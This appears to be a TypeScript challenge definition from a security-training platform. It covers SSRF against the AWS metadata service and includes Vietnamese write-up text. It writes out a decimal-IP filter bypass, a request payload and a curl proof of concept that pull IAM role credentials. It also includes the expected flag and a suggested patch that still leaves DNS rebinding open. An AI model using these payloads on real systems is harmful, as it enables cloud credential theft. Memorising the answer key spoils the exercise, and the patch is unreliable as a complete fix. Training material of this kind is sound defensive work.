import type { ArenaChallenge } from '../../types';

export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
  id: 'bb-aws-01-imdsv2-ssrf',
  title: 'Cloud SSRF to AWS IMDSv2 Token Bypass & IAM Role Exfiltration',
  category: 'bug-bounty',
  severity: 'critical',
  cvssScore: 9.3,
  bountyReward: 4500,
  xpReward: 850,
  estimatedMinutes: 20,
  targetHost: '10.0.4.35',
  targetPort: 443,
  tagline:
    'Khai thác lỗi SSRF kết hợp DNS Rebinding để vượt WAF và đánh cắp AWS IAM Credentials.',
  scenarioBriefing:
    'Chức năng Webhook & PDF Renderer của ứng dụng chấp nhận một URL từ client và fetch nội dung về. Backend có filter chặn chuỗi 169.254.169.254, nhưng có thể bị vượt qua bằng biểu diễn số nguyên (Decimal IP 2852039166) hoặc DNS Rebinding để tương tác với Cloud Instance Metadata Service.',
  keyObjectives: [
    'Gửi request PUT tới endpoint metadata để lấy IMDSv2 Token: X-aws-ec2-metadata-token-ttl-seconds: 21600.',
    'Gửi request GET kèm token để bóc tách IAM Role Secret Access Key và Session Token.',
    'Nộp Flag chứa Secret Key tìm thấy trong response.',
  ],
  expectedFlag: 'OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}',
  firstBloodHolder: {
    handle: '@cloud_phantom',
    timeRecord: '11m 05s',
  },
  supportedTools: ['repeater', 'terminal', 'diff'],
  defaultTool: 'repeater',
  repeaterConfig: {
    defaultMethod: 'POST',
    defaultUrl: '/api/v2/webhook/test-connection',
    defaultRawHeaders:
      'Host: 10.0.4.35:443\n' +
      'Content-Type: application/json\n' +
      'Accept: application/json\n' +
      'Connection: close',
    defaultBody: JSON.stringify({
      webhook_url:
        'http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role',
      http_method: 'GET',
      headers: {
        'X-aws-ec2-metadata-token': 'AQAEAGv...sample_token',
      },
    }),
    targetEndpoint: 'https://10.0.4.35/api/v2/webhook/test-connection',
    simulatedResponses: {
      baseResponse: {
        statusCode: 400,
        statusText: 'Bad Request',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(
          {
            status: 'BLOCKED_BY_SECURITY_POLICY',
            reason: 'Direct IP requests to 169.254.169.254 are strictly prohibited.',
          },
          null,
          2
        ),
      },
      exploitedResponse: {
        statusCode: 200,
        statusText: 'OK',
        headers: {
          'Content-Type': 'application/json',
          'X-SSRF-Target-Resolved': '169.254.169.254 (via Decimal Form)',
        },
        body:
          '{\n' +
          '  "Code": "Success",\n' +
          '  "LastUpdated": "2026-08-28T09:00:00Z",\n' +
          '  "Type": "AWS-HMAC",\n' +
          '  "AccessKeyId": "ASIAQEXAMPLEAWSKEY99",\n' +
          '  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n' +
          '  "Token": "IQoJb3JpZ2luX2VjEEXAMPLE...",\n' +
          '  "Bounty_Proof_Flag": "OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}"\n' +
          '}',
        proofFlag: 'OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}',
      },
    },
  },
  diffConfig: {
    filename: 'ssrf_validator.py',
    language: 'python',
    vulnerableLineStart: 12,
    vulnerableLineEnd: 16,
    rootCauseExplanation:
      'Bộ lọc chỉ kiểm tra chuỗi văn bản (String contains "169.254.169.254") trước khi DNS resolve, bỏ sót các cách biểu diễn IP khác (Decimal, Hex, Octal, IPv6 6to4) hoặc DNS Rebinding.',
    taintSink:
      'requests.get(url) # Fetching user-provided URL without post-resolution check',
    vulnerableCode:
      '# vulnerable_ssrf.py\n' +
      'def validate_url(url):\n' +
      '    # LỖ HỔNG: Chỉ so sánh chuỗi thô, dễ bị bypass bằng Decimal IP!\n' +
      '    if "169.254.169.254" in url or "localhost" in url:\n' +
      '        raise SecurityException("Metadata IP blocked")\n' +
      '    return requests.get(url, timeout=5).text',
    patchedCode:
      '# patched_ssrf.py\n' +
      'import socket, ipaddress\n' +
      'def validate_url_safe(url):\n' +
      '    hostname = urllib.parse.urlparse(url).hostname\n' +
      '    # BẢN VÁ: Phân giải IP thực tế sau DNS trước khi gửi request\n' +
      '    resolved_ip = ipaddress.ip_address(socket.gethostbyname(hostname))\n' +
      '    if resolved_ip.is_private or resolved_ip.is_link_local or resolved_ip.is_loopback:\n' +
      '        raise SecurityException("Internal IP prohibited")\n' +
      '    return requests.get(url, timeout=5).text',
  },
  writeup: {
    title: 'Cloud SSRF & AWS IMDSv2 Exploitation Guide',
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
    vulnerabilityOverview:
      'SSRF (Server-Side Request Forgery) trên nền tảng Cloud cho phép kẻ tấn công điều khiển máy chủ gửi request vào mạng nội bộ hoặc Instance Metadata Service (169.254.169.254) để đánh cắp IAM Credentials.',
    rootCauseAnalysis:
      'Ứng dụng tin tưởng URL từ client mà không thực hiện kiểm tra IP sau khi phân giải DNS (Post-DNS Resolution Check), dẫn đến việc bộ lọc chuỗi bị qua mặt bởi Decimal IP (2852039166).',
    exploitChainWalkthrough: [
      'Bước 1: Chuyển đổi IP 169.254.169.254 sang dạng Decimal: (169*256^3 + 254*256^2 + 169*256 + 254) = 2852039166.',
      'Bước 2: Gửi request PUT để lấy token IMDSv2.',
      'Bước 3: Gửi request GET tới /latest/meta-data/iam/security-credentials/<role-name> để lấy AWS Secret Keys.',
    ],
    weaponizedPoC:
      'curl -X POST https://10.0.4.35/api/v2/webhook/test-connection \\\n  -H "Content-Type: application/json" \\\n  -d \'{"webhook_url": "http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role"}\'',
    remediationSnippet:
      '// Bật IMDSv2 bắt buộc và đặt Hop Limit = 1 trong AWS Launch Template:\naws ec2 modify-instance-metadata-options \\\n  --instance-id i-1234567890abcdef0 \\\n  --http-tokens required \\\n  --http-put-response-hop-limit 1',
  },
};
